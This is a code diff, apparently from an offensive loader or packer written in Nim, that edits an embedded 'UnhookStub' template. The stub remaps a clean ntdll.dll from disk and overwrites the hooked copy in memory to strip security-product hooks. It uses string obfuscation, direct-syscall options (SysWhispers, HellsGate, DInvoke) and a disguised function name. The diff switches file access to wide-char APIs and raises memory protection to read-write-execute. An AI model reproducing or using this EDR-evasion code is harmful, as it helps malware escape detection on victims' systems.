@@ -976,7 +976,7 @@ let UnhookStub * = """
         var 
             mi : MODULEINFO
             ntdllBase : LPVOID
-            ntdllFile : FileHandle
+            ntdllFile : HANDLE
             ntdllMapping : HANDLE
             ntdllMappingAddress : LPVOID
             hookedDosHeader : PIMAGE_DOS_HEADER
@@ -989,18 +989,20 @@ let UnhookStub * = """
             discard GetModuleInformation(processH, ntdllModule, cast[LPMODULEINFO](addr mi), cast[DWORD](sizeof(mi)))
         ntdllBase = mi.lpBaseOfDll
 
-        var dllCstring: cstring = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
+        var dllString = obf("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA")
+        var dllwstring: WideCString = newWideCString(dllString)
         var dllPath: string
-        discard GetModuleFileNameA(ntdllModule, cast[LPSTR](dllCstring), DWORD(len(dllCstring)))
+        discard GetModuleFileNameW(ntdllModule, cast[LPWSTR](dllwstring), DWORD(len(dllwstring) * 2))
         when defined(verbose):
-            dllPath = $dllCstring
+            dllPath = $dllwstring
             echo obf("[*] Target DLL path: "), dllPath
-            
-        ntdllFile = getOsFileHandle(open(dllPath,fmRead))
+        
+        ntdllFile = CreateFileW(dllwstring, GENERIC_READ, FILE_SHARE_READ, nil, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0)
+        
         when defined(DInvoke):
             ntdllMapping = MyCreateFileMappingA(ntdllFile, NULL, PAGE_READONLY or SEC_IMAGE, 0, 0, NULL) # 0x02 =  PAGE_READONLY & 0x1000000 = SEC_IMAGE
         else:
-            ntdllMapping = CreateFileMappingA(ntdllFile, NULL, PAGE_READONLY or SEC_IMAGE, 0, 0, NULL) # 0x02 =  PAGE_READONLY & 0x1000000 = SEC_IMAGE
+            ntdllMapping = CreateFileMappingW(ntdllFile, NULL, PAGE_READONLY or SEC_IMAGE, 0, 0, NULL) # 0x02 =  PAGE_READONLY & 0x1000000 = SEC_IMAGE
         if ntdllMapping == 0:
             when defined(verbose):
                 echo obf("Could not create file mapping object ") &  fmt"({GetLastError()})."
@@ -1031,7 +1033,7 @@ let UnhookStub * = """
                         pSize = pSize - 0x4000
                         ntdllMappingAddress = ntdllMappingAddress + 0x4000
                 when defined(SysWhispers):
-                    status = uashdiasdj(processH, &ds, &pSize, 0x04, &oldProtection)
+                    status = uashdiasdj(processH, &ds, &pSize, 0x40, &oldProtection)
                     if status != 0:
                         when defined(verbose):
                             echo obf("[!] uashdiasdj failed to modify memory permissions:") & fmt"{status}."
@@ -1057,7 +1059,7 @@ let UnhookStub * = """
                         # We need to use RWX here, as with RW the Syscall it'self (retrieved via HellsGate from memory ntdll) cannot execute anymore and the process crashes.
                         status = NtProtectVirtualMemory(processH, addr ds, addr pSize, 0x40, addr oldProtection)    
                     when defined(GetSyscallStub):
-                        status = NtProtectVirtualMemory(processH, addr ds, addr pSize, 0x04, addr oldProtection)
+                        status = NtProtectVirtualMemory(processH, addr ds, addr pSize, 0x40, addr oldProtection)
                     if status != 0:
                         when defined(verbose):
                             echo obf("[!] NtProtectVirtualMemory failed to modify memory permissions:") & fmt"{status}."
